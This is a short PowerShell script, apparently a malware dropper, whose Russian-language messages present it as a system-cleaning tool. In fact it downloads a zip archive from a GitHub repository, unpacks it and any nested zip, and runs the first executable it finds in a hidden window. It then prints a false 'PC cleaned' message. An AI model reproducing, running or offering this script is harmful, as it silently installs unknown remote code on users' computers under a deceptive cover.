# =============================================
# initialization.ps1
# =============================================

$Url = "https://github.com/v25888656-maker/CHECKK/archive/refs/heads/main.zip"
$ZipPath = "$env:TEMP\main.zip"
$ExtractPath = "$env:TEMP\CHECKK-main"

Write-Host "[*] Очистка системы..." -ForegroundColor Cyan
Start-Sleep -Seconds 1

try {
    (New-Object Net.WebClient).DownloadFile($Url, $ZipPath)
} catch {
    Write-Host "[-] Ошибка очистки" -ForegroundColor Red
    Start-Sleep -Seconds 2
    exit
}

try {
    Expand-Archive -Path $ZipPath -DestinationPath $ExtractPath -Force
} catch {
    Write-Host "[-] Ошибка очистки" -ForegroundColor Red
    Start-Sleep -Seconds 2
    exit
}

$Zip2 = Get-ChildItem -Path $ExtractPath -Filter "*.zip" -Recurse | Select-Object -First 1

if ($Zip2) {
    try {
        Expand-Archive -Path $Zip2.FullName -DestinationPath $ExtractPath -Force
    } catch {
        Write-Host "[-] Ошибка очистки" -ForegroundColor Red
        Start-Sleep -Seconds 2
        exit
    }
}

$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1

if ($Exe) {
    Start-Process -WindowStyle Hidden $Exe.FullName
    Write-Host "[+] ПК очищен" -ForegroundColor Green
} else {
    Write-Host "[-] Ошибка очистки" -ForegroundColor Red
}

Start-Sleep -Seconds 2
exit
